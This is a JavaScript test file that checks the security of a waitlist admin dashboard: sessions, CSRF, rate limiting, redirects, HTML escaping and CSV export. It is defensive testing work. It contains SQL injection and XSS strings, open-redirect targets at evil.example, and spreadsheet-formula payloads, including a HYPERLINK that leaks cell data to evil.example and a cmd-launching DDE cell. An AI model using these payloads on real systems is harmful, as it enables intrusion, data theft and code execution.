import assert from 'node:assert/strict';
import { after, before, describe, test } from 'node:test';
import { CSP } from '../src/app.js';
import { COLUMNS } from '../src/fields.js';
import {
  BULK,
  Browser,
  PASSWORD,
  adminQuery,
  createTempDb,
  fakeClock,
  fixtureRows,
  startApp,
} from './helpers.mjs';

const TOTAL = fixtureRows().length;
const DATA_PAGES = [
  '/',
  '/signups',
  '/signups/UAIN-00000001',
  '/export.csv',
  '/signups?q=kestrel',
  '/nowhere',
];

let db;
before(async () => {
  db = await createTempDb();
});
after(async () => {
  await db?.drop();
});

/** Every security header, on any response. */
function assertSecurityHeaders(res, where) {
  assert.equal(res.headers.get('content-security-policy'), CSP, where);
  assert.equal(res.headers.get('x-content-type-options'), 'nosniff', where);
  assert.equal(res.headers.get('referrer-policy'), 'no-referrer', where);
  assert.equal(res.headers.get('x-robots-tag'), 'noindex, nofollow', where);
  assert.equal(res.headers.get('x-frame-options'), 'DENY', where);
  assert.equal(res.headers.get('cache-control'), 'no-store', where);
}

/** No markup from a row survives into a page: it is all escaped. */
function assertEscaped(text, where) {
  assert.ok(!/<script/i.test(text), `${where}: raw <script>`);
  assert.ok(!/<img/i.test(text), `${where}: raw <img>`);
  assert.ok(!/<iframe/i.test(text), `${where}: raw <iframe>`);
  assert.ok(!/<svg onload/i.test(text), `${where}: raw <svg onload>`);
  assert.ok(
    !/<a [^>]*href="\s*(javascript|data|vbscript):/i.test(text),
    `${where}: script URL in a link`,
  );
  // The only data: URL on a page is the favicon this app draws.
  assert.equal(
    (text.match(/"data:/g) ?? []).length,
    text.includes('<link rel="icon"') ? 1 : 0,
    `${where}: data URL`,
  );
  // An event handler as an attribute of a real tag. Attribute values are
  // blanked first: an escaped `onerror=` inside value="…" is only text.
  const tags = text.replace(/"[^"]*"/g, '""');
  assert.ok(
    !/<[a-z][^>]*\son[a-z]+\s*=/i.test(tags),
    `${where}: event handler attribute`,
  );
}

describe('without a session', () => {
  let app;
  before(async () => {
    app = await startApp({ databaseUrl: db.url });
  });
  after(() => app.close());

  test('every data page and the CSV send you to sign in', async () => {
    const b = new Browser(app.base);
    for (const path of DATA_PAGES) {
      for (const method of ['GET', 'HEAD']) {
        const res = await b.request(path, { method });
        assert.equal(res.status, 303, `${method} ${path}`);
        assert.match(res.headers.get('location'), /^\/login(\?next=|$)/, path);
        assertSecurityHeaders(res, path);
        assert.ok(!res.text.includes('kestrel@example.org'));
      }
    }
    const csv = await b.request('/export.csv?status=unverified');
    assert.equal(
      csv.headers.get('location'),
      `/login?next=${encodeURIComponent('/export.csv?status=unverified')}`,
    );
    assert.equal(csv.headers.get('content-disposition'), null);
    const post = await b.request('/export.csv', {
      method: 'POST',
      form: { a: 1 },
    });
    assert.equal(post.status, 401);
  });

  test('a cookie that is made up, altered or signed elsewhere is refused', async () => {
    const good = new Browser(app.base);
    assert.equal((await good.login()).status, 303);
    const token = good.jar.get('__Host-wl_session');
    const [sid, exp, sig] = token.split('.');
    // Replacing a random suffix with AA can accidentally leave it unchanged.
    const flip = (value) => (value[0] === 'A' ? 'B' : 'A') + value.slice(1);
    for (const forged of [
      `${sid}.${exp}.${flip(sig)}`,
      `${sid}.${Number(exp) + 3600000}.${sig}`,
      `${flip(sid)}.${exp}.${sig}`,
      'x.y.z',
      'admin',
    ]) {
      assert.notEqual(forged, token);
      const b = new Browser(app.base);
      b.jar.set('__Host-wl_session', forged);
      const res = await b.request('/');
      assert.equal(res.status, 303, forged);
    }
    // The same cookie without the __Host- prefix is not the session cookie.
    const plain = new Browser(app.base);
    plain.jar.set('wl_session', token);
    assert.equal((await plain.request('/')).status, 303);
  });
});

describe('signing in and out', () => {
  let app;
  let now;
  before(async () => {
    now = fakeClock();
    app = await startApp({ databaseUrl: db.url, now });
  });
  after(() => app.close());

  test('the sign-in form sets a CSRF cookie and carries its token', async () => {
    const b = new Browser(app.base);
    const res = await b.request('/login');
    assert.equal(res.status, 200);
    assertSecurityHeaders(res, '/login');
    const set = res.cookies.find((c) => c.startsWith('__Host-wl_login='));
    assert.ok(set);
    for (const flag of ['HttpOnly', 'Secure', 'SameSite=Strict', 'Path=/'])
      assert.ok(set.includes(flag), flag);
    assert.ok(Browser.csrf(res.text));
    // A second visit keeps the same pair, so two open tabs both work.
    const again = await b.request('/login');
    assert.equal(again.cookies.length, 0);
    assert.equal(Browser.csrf(again.text), Browser.csrf(res.text));
  });

  test('signing in needs the CSRF token', async () => {
    // No token.
    const b = new Browser(app.base);
    await b.request('/login');
    const none = await b.request('/login', {
      method: 'POST',
      form: { password: PASSWORD },
    });
    assert.equal(none.status, 403);
    assert.equal(b.jar.has('__Host-wl_session'), false);
    // A wrong token.
    const wrong = await b.request('/login', {
      method: 'POST',
      form: { password: PASSWORD, csrf: 'x'.repeat(43) },
    });
    assert.equal(wrong.status, 403);
    // The right token without its cookie.
    const page = await new Browser(app.base).request('/login');
    const bare = new Browser(app.base);
    const noCookie = await bare.request('/login', {
      method: 'POST',
      form: { password: PASSWORD, csrf: Browser.csrf(page.text) },
    });
    assert.equal(noCookie.status, 403);
    // Not a form.
    const json = await b.request('/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
    });
    assert.equal(json.status, 403);
    // A post another site's page makes.
    const cross = await b.login(PASSWORD);
    assert.equal(cross.status, 303); // same-origin: fine
    const b2 = new Browser(app.base, { 'sec-fetch-site': 'cross-site' });
    const page2 = await b2.request('/login');
    const refused = await b2.request('/login', {
      method: 'POST',
      form: { password: PASSWORD, csrf: Browser.csrf(page2.text) },
    });
    assert.equal(refused.status, 403);
    assert.equal(b2.jar.has('__Host-wl_session'), false);
  });

  test('a wrong password is refused and logged without the password', async () => {
    const b = new Browser(app.base);
    const res = await b.login('not the password at all');
    assert.equal(res.status, 401);
    assert.match(res.text, /That password is not right/);
    assert.equal(b.jar.has('__Host-wl_session'), false);
    const entry = app.logs.findLast((e) => e.event === 'login_failure');
    assert.equal(entry.kind, 'audit');
    assert.equal(entry.reason, 'wrong_password');
    assert.equal(entry.ip, '127.0.0.1');
    const logged = JSON.stringify(app.logs);
    assert.ok(!logged.includes('not the password at all'));
    assert.ok(!logged.includes(PASSWORD));
  });

  test('the right password gives a strict, secure, twelve-hour session cookie', async () => {
    const b = new Browser(app.base);
    const res = await b.login(PASSWORD, { next: '/signups?status=verified' });
    assert.equal(res.status, 303);
    assert.equal(res.headers.get('location'), '/signups?status=verified');
    const set = res.cookies.find((c) => c.startsWith('__Host-wl_session='));
    for (const flag of [
      'HttpOnly',
      'Secure',
      'SameSite=Strict',
      'Path=/',
      'Max-Age=43200',
    ])
      assert.ok(set.includes(flag), flag);
    assert.ok(!/Domain=/i.test(set));
    assert.ok(
      res.cookies.some(
        (c) => c.startsWith('__Host-wl_login=;') && c.includes('Max-Age=0'),
      ),
    );
    assert.equal((await b.request('/')).status, 200);
    assert.equal(
      app.logs.findLast((e) => e.kind === 'audit').event,
      'login_success',
    );
    // Signed in, the sign-in page sends you on.
    assert.equal((await b.request('/login')).status, 303);
  });

  test('after sign-in you only ever land on this site', async () => {
    for (const next of [
      '//evil.example/',
      'https://evil.example/',
      '/.//evil.example',
      '/\\evil.example',
    ]) {
      const b = new Browser(app.base);
      const res = await b.login(PASSWORD, { next });
      assert.equal(res.headers.get('location'), '/', next);
    }
  });

  test('signing out needs the CSRF token and ends the session for good', async () => {
    const b = new Browser(app.base);
    await b.login();
    const page = await b.request('/');
    const token = b.jar.get('__Host-wl_session');

    const noToken = await b.request('/logout', { method: 'POST', form: {} });
    assert.equal(noToken.status, 403);
    const badToken = await b.request('/logout', {
      method: 'POST',
      form: { csrf: 'nope' },
    });
    assert.equal(badToken.status, 403);
    assert.equal((await b.request('/')).status, 200, 'still signed in');
    assert.equal(
      (await b.request('/logout')).status,
      405,
      'GET does not sign out',
    );

    const out = await b.request('/logout', {
      method: 'POST',
      form: { csrf: Browser.csrf(page.text) },
    });
    assert.equal(out.status, 303);
    assert.equal(out.headers.get('location'), '/login');
    assert.ok(
      out.cookies.some(
        (c) => c.startsWith('__Host-wl_session=;') && c.includes('Max-Age=0'),
      ),
    );
    assert.equal(app.logs.findLast((e) => e.kind === 'audit').event, 'logout');

    // The old cookie, kept and sent again, no longer works.
    const replay = new Browser(app.base);
    replay.jar.set('__Host-wl_session', token);
    for (const path of DATA_PAGES)
      assert.equal((await replay.request(path)).status, 303, path);
  });

  test('a session ends twelve hours after sign-in', async () => {
    const b = new Browser(app.base);
    await b.login();
    now.advance(12 * 3600 * 1000 - 60000);
    assert.equal((await b.request('/')).status, 200);
    now.advance(60000);
    const res = await b.request('/');
    assert.equal(res.status, 303);
    assert.equal(res.headers.get('location'), '/login');
  });
});

describe('the sign-in rate limit', () => {
  let app;
  let now;
  before(async () => {
    now = fakeClock();
    app = await startApp({ databaseUrl: db.url, now });
  });
  after(() => app.close());

  test('ten failures from one address in fifteen minutes, then 429', async () => {
    const attacker = new Browser(app.base, {
      'x-forwarded-for': '203.0.113.9',
    });
    for (let i = 0; i < 10; i++)
      assert.equal(
        (await attacker.login(`guess ${i}`)).status,
        401,
        `guess ${i}`,
      );
    const blocked = await attacker.login(PASSWORD);
    assert.equal(blocked.status, 429, 'even the right password');
    assert.ok(Number(blocked.headers.get('retry-after')) > 0);
    assertSecurityHeaders(blocked, '429');
    assert.equal(attacker.jar.has('__Host-wl_session'), false);
    assert.equal(
      app.logs.findLast((e) => e.event === 'login_failure').reason,
      'rate_limited',
    );
    assert.equal(
      app.logs.findLast((e) => e.event === 'login_failure').ip,
      '203.0.113.9',
    );

    // Writing another address further left changes nothing: the front door
    // appends the real one.
    const spoof = new Browser(app.base, {
      'x-forwarded-for': '198.51.100.1, 203.0.113.9',
    });
    assert.equal((await spoof.login(PASSWORD)).status, 429);

    // Another address is unaffected.
    const admin = new Browser(app.base, { 'x-forwarded-for': '198.51.100.2' });
    assert.equal((await admin.login(PASSWORD)).status, 303);

    // Fifteen minutes on, the address may try again.
    now.advance(15 * 60 * 1000 + 1000);
    assert.equal((await attacker.login(PASSWORD)).status, 303);
  });

  test('parallel guesses cannot slip past the limit', async () => {
    const ip = { 'x-forwarded-for': '203.0.113.77' };
    const pages = await Promise.all(
      Array.from({ length: 30 }, async () => {
        const b = new Browser(app.base, ip);
        const page = await b.request('/login');
        return { b, csrf: Browser.csrf(page.text) };
      }),
    );
    const results = await Promise.all(
      pages.map(({ b, csrf }) =>
        b.request('/login', {
          method: 'POST',
          form: { csrf, password: 'wrong guess' },
        }),
      ),
    );
    const checked = results.filter((r) => r.status === 401).length;
    assert.equal(checked, 10);
    assert.equal(results.filter((r) => r.status === 429).length, 20);
  });
});

describe('signed in', () => {
  let app;
  let b;
  before(async () => {
    app = await startApp({ databaseUrl: db.url });
    b = new Browser(app.base);
    assert.equal((await b.login()).status, 303);
  });
  after(() => app.close());

  test('the overview has the totals, counts, charts and the latest ten', async () => {
    const res = await b.request('/');
    assert.equal(res.status, 200);
    assertSecurityHeaders(res, '/');
    assert.match(res.headers.get('content-type'), /^text\/html/);
    const t = res.text;
    assert.match(
      t,
      new RegExp(`<span>Sign-ups</span><strong>${TOTAL}</strong>`),
    );
    assert.match(t, /<svg id="chart-daily"/);
    assert.match(t, /<svg id="chart-total"/);
    for (const heading of [
      'Status',
      'Channel',
      'System types',
      'Networks',
      'Contributes',
      'Wants',
      'Missions',
      'Latest 10',
    ])
      assert.ok(
        t.includes(`<h2>${heading}</h2>`) || t.includes(`>${heading}</h2>`),
        heading,
      );
    assert.ok(t.includes('Foundation Model / LLM'));
    assert.ok(t.includes('1 sign-up has an unreadable date'));
    // The row with no readable date is in the total, and in no time window.
    assert.match(t, /<span>Last 24 hours<\/span><strong>0<\/strong>/);
    assert.match(
      t,
      /<span>Latest<\/span><strong[^>]*>2026-09-28 10:49 UTC<\/strong>/,
    );
    // The latest ten, newest first.
    const latest = t.slice(t.indexOf('Latest 10'));
    assert.equal((latest.match(/<tr><td class="id">/g) ?? []).length, 10);
    assertEscaped(t, '/');
  });

  test('the sign-ups table pages, 50 at a time', async () => {
    const one = await b.request('/signups');
    assert.equal(one.status, 200);
    assert.equal((one.text.match(/<td class="id">/g) ?? []).length, 50);
    assert.ok(one.text.includes(`Showing 1–50 of ${TOTAL}`));
    const two = await b.request('/signups?page=2');
    assert.equal((two.text.match(/<td class="id">/g) ?? []).length, TOTAL - 50);
    for (const page of ['0', '-1', 'abc', '1e9', '99999999999'])
      assert.ok(
        (await b.request(`/signups?page=${page}`)).text.includes(
          `Showing 1–50 of ${TOTAL}`,
        ),
        page,
      );
    assertEscaped(one.text, '/signups');
    assertEscaped(two.text, '/signups?page=2');
  });

  test('search covers name, email, operator, description, url and goals', async () => {
    const count = async (qs) => {
      const res = await b.request(`/signups?${qs}`);
      assert.equal(res.status, 200, qs);
      return (res.text.match(/<td class="id">/g) ?? []).length;
    };
    assert.equal(await count('q=kestrel'), 1); // name, email, url
    assert.equal(await count('q=KESTREL+LABS'), 1); // operator, any case
    assert.equal(await count('q=replication'), 1); // description
    assert.equal(await count('q=cures+faster'), 1); // goals
    assert.equal(await count('q=bulk7%40example.org'), 1); // email
    assert.equal(await count('q=UAIN-00000004'), 1); // id
    assert.equal(await count('q=nobody+matches+this'), 0);
  });

  test('search text with SQL and LIKE metacharacters is only text', async () => {
    const count = async (q) => {
      const res = await b.request(`/signups?q=${encodeURIComponent(q)}`);
      assert.equal(res.status, 200, q);
      assertEscaped(res.text, q);
      return (res.text.match(/<td class="id">/g) ?? []).length;
    };
    assert.equal(await count(`'; DROP TABLE waitlist; --`), 0);
    assert.equal(await count(`' OR '1'='1`), 0);
    assert.equal(await count(`" OR ""="`), 0);
    assert.equal(
      await count(`' OR 1=1 --`),
      1,
      'the row whose goals are that text',
    );
    assert.equal(await count('%'), 1, '% is a percent sign, not a wildcard');
    assert.equal(await count('_'), 1, '_ is an underscore, not a wildcard');
    assert.equal(await count('\\'), 1, 'a backslash is a backslash');
    assert.equal(await count('$1'), 0);
    const still = await adminQuery(
      'SELECT count(*)::int AS n FROM waitlist',
      [],
      db.url,
    );
    assert.equal(still.rows[0].n, TOTAL);
  });

  test('filters and sorting take only what the allow-lists hold', async () => {
    const ids = (text) =>
      [
        ...text.matchAll(
          /<td class="id"><a class="mono" href="\/signups\/(UAIN-\d{8})"/g,
        ),
      ].map((m) => m[1]);
    const status = await b.request('/signups?status=verified');
    assert.deepEqual(ids(status.text), ['UAIN-00000004']);
    const channel = await b.request('/signups?channel=api');
    assert.equal(ids(channel.text).length, 3);
    const type = await b.request('/signups?type=robotics');
    assert.equal(ids(type.text).length, BULK / 2);
    const both = await b.request('/signups?type=ai_agent&channel=api');
    assert.equal(ids(both.text).length, 3);

    // Injection through a filter value finds nothing; through the type
    // filter it is not even a filter.
    assert.equal(
      ids(
        (
          await b.request(
            `/signups?status=${encodeURIComponent("' OR '1'='1")}`,
          )
        ).text,
      ).length,
      0,
    );
    assert.ok(
      (
        await b.request(`/signups?type=${encodeURIComponent("x' OR 1=1 --")}`)
      ).text.includes(`of ${TOTAL}`),
    );

    // Sorting: by an allowed column, either way; anything else is the default.
    const byName = ids((await b.request('/signups?sort=name&dir=asc')).text);
    const byNameDesc = ids(
      (await b.request('/signups?sort=name&dir=desc&page=2')).text,
    );
    assert.equal(byName[0], 'UAIN-00000002'); // '<script>…' sorts before letters
    assert.equal(byNameDesc.at(-1), 'UAIN-00000002');
    const def = ids((await b.request('/signups')).text);
    for (const qs of [
      'sort=seq;DROP TABLE waitlist',
      'sort=__proto__',
      'sort=constructor',
      'dir=sideways',
      'sort=name%20desc',
      'sort=registered&dir=asc;--',
    ]) {
      const res = await b.request(`/signups?${qs}`);
      assert.equal(res.status, 200, qs);
      if (!qs.startsWith('sort=registered'))
        assert.deepEqual(ids(res.text), def, qs);
    }
    const byId = ids((await b.request('/signups?sort=id&dir=asc')).text);
    assert.equal(byId[0], 'UAIN-00000001');
  });

  test('a sign-up shows every field, lists as lists, links made safe', async () => {
    const res = await b.request('/signups/UAIN-00000001');
    assert.equal(res.status, 200);
    assertSecurityHeaders(res, 'detail');
    for (const label of [
      'Queue position',
      'System types',
      'Contributes',
      'Wants',
      'Missions',
      'Networks',
      'Email',
      'Wallet',
      'User agent',
      'Registered',
    ])
      assert.ok(res.text.includes(`<dt>${label}</dt>`), label);
    assert.equal((res.text.match(/<dt>/g) ?? []).length, COLUMNS.length);
    assert.match(
      res.text,
      /<ul><li>Intelligence \/ Reasoning <span class="key">intelligence<\/span><\/li><li>Compute \/ GPUs/,
    );
    assert.ok(
      res.text.includes(
        '<a href="https://kestrel.example.org/about" rel="noopener noreferrer nofollow" target="_blank">',
      ),
    );
    assert.ok(
      res.text.includes(
        'href="mailto:kestrel@example.org" rel="noopener noreferrer nofollow"',
      ),
    );
    assert.equal(app.logs.findLast((e) => e.kind === 'audit').event, 'view');
    assert.equal(
      app.logs.findLast((e) => e.kind === 'audit').id,
      'UAIN-00000001',
    );

    // The hostile row: every value shown, none of it live.
    const evil = await b.request('/signups/UAIN-00000002');
    assert.equal(evil.status, 200);
    assertEscaped(evil.text, 'hostile detail');
    assert.ok(evil.text.includes('&lt;script&gt;alert(1)&lt;/script&gt;'));
    assert.ok(
      evil.text.includes('<span class="mono">javascript:alert(4)</span>'),
      'javascript: URL shown as text',
    );
    assert.ok(
      !evil.text.includes('mailto:x@'),
      'an email with markup is not a link',
    );

    // A row with broken JSON still shows, as the text it holds.
    const broken = await b.request('/signups/UAIN-00000005');
    assert.equal(broken.status, 200);
    assert.ok(broken.text.includes('not json'));

    for (const path of [
      '/signups/UAIN-99999999',
      '/signups/UAIN-1',
      '/signups/%3Cscript%3E',
      '/signups/UAIN-00000000',
    ]) {
      const missing = await b.request(path);
      assert.equal(missing.status, 404, path);
      assertEscaped(missing.text, path);
    }
  });

  test('no page carries markup from the data', async () => {
    for (let seq = 1; seq <= 6; seq++) {
      const res = await b.request(
        `/signups/UAIN-${String(seq).padStart(8, '0')}`,
      );
      assertEscaped(res.text, `detail ${seq}`);
    }
    for (const path of [
      '/',
      '/signups',
      '/signups?page=2',
      `/signups?q=${encodeURIComponent('<script>alert(1)</script>')}`,
      `/signups?status=${encodeURIComponent('<script>alert(7)</script>')}`,
      `/signups?channel=${encodeURIComponent('"><script>alert(11)</script>')}`,
      `/signups?sort=name&dir=asc&q=${encodeURIComponent('"><img src=x onerror=alert(12)>')}`,
    ]) {
      const res = await b.request(path);
      assert.equal(res.status, 200, path);
      assertEscaped(res.text, path);
    }
  });

  test('the CSV has every row and column, no live formulas, and is not cached', async () => {
    const res = await b.request('/export.csv');
    assert.equal(res.status, 200);
    assertSecurityHeaders(res, 'csv');
    assert.equal(res.headers.get('content-type'), 'text/csv; charset=utf-8');
    assert.match(
      res.headers.get('content-disposition'),
      /^attachment; filename="uain-waitlist-\d{4}-\d{2}-\d{2}\.csv"$/,
    );
    const text = res.text.replace(/^\uFEFF/, '');
    const header = text.split('\r\n')[0];
    assert.equal(header, ['id', ...COLUMNS].map((c) => `"${c}"`).join(','));
    // One line per row, plus the header; the one multi-line value adds a line.
    assert.equal(text.split('\r\n').length - 1, TOTAL + 1);
    for (const cell of [
      `"'=HYPERLINK(""http://evil.example/?leak=""&A1,""Click"")"`,
      `"'+cmd|' /C calc'!A0"`,
      `"'-2+3"`,
      `"'@SUM(1+1)"`,
      `"'\t=1+1"`,
      `"'\r=1+1"`,
      `"https://example.org/""quoted"""`,
      `"O'Brien ""Quotes"" 100% _under_"`,
    ])
      assert.ok(text.includes(cell), cell);
    // No cell starts with a formula character.
    assert.ok(!/(^|,)"[=+\-@\t\r]/m.test(text));
    const entry = app.logs.findLast((e) => e.kind === 'audit');
    assert.equal(entry.event, 'export');
    assert.equal(entry.rows, TOTAL);
  });

  test('the CSV takes the current filter', async () => {
    const res = await b.request('/export.csv?channel=api&q=%25');
    const lines = res.text.replace(/^\uFEFF/, '').trim().split('\r\n');
    assert.ok(lines[1].startsWith('"UAIN-00000004"'));
    const entry = app.logs.findLast((e) => e.kind === 'audit');
    assert.equal(entry.rows, 1);
    assert.deepEqual(entry.filter, {
      q: '%',
      status: '',
      channel: 'api',
      type: '',
    });
    // The table's export link carries the filter.
    const page = await b.request(
      '/signups?channel=api&sort=name&dir=asc&page=1',
    );
    assert.ok(
      page.text.includes(
        'href="/export.csv?channel=api&amp;sort=name&amp;dir=asc"',
      ),
    );
  });

  test('HSTS only when the front door says the request came over HTTPS', async () => {
    const plain = await b.request('/');
    assert.equal(plain.headers.get('strict-transport-security'), null);
    const tls = await b.request('/', {
      headers: { 'x-forwarded-proto': 'https' },
    });
    assert.equal(
      tls.headers.get('strict-transport-security'),
      'max-age=31536000; includeSubDomains',
    );
    const health = await new Browser(app.base).request('/healthz', {
      headers: { 'x-forwarded-proto': 'https' },
    });
    assert.ok(health.headers.get('strict-transport-security'));
  });

  test('pages answer only GET and HEAD', async () => {
    for (const path of ['/', '/signups', '/export.csv']) {
      const res = await b.request(path, { method: 'PUT' });
      assert.equal(res.status, 405, path);
      assertSecurityHeaders(res, `PUT ${path}`);
    }
    const head = await b.request('/signups', { method: 'HEAD' });
    assert.equal(head.status, 200);
    assert.equal(head.text, '');
  });

  test('/healthz says configured', async () => {
    const res = await new Browser(app.base).request('/healthz');
    assert.equal(res.status, 200);
    assert.deepEqual(JSON.parse(res.text), { ok: true, configured: true });
    assertSecurityHeaders(res, '/healthz');
  });
});

describe('local development', () => {
  test('WAITLIST_INSECURE_COOKIES=1 drops Secure and the __Host- prefix', async () => {
    const app = await startApp({
      databaseUrl: db.url,
      env: { WAITLIST_INSECURE_COOKIES: '1' },
    });
    try {
      const b = new Browser(app.base);
      const res = await b.login();
      const set = res.cookies.find((c) => c.startsWith('wl_session='));
      assert.ok(set);
      assert.ok(!set.includes('Secure'));
      assert.ok(set.includes('HttpOnly') && set.includes('SameSite=Strict'));
      assert.equal((await b.request('/')).status, 200);
    } finally {
      await app.close();
    }
  });
});
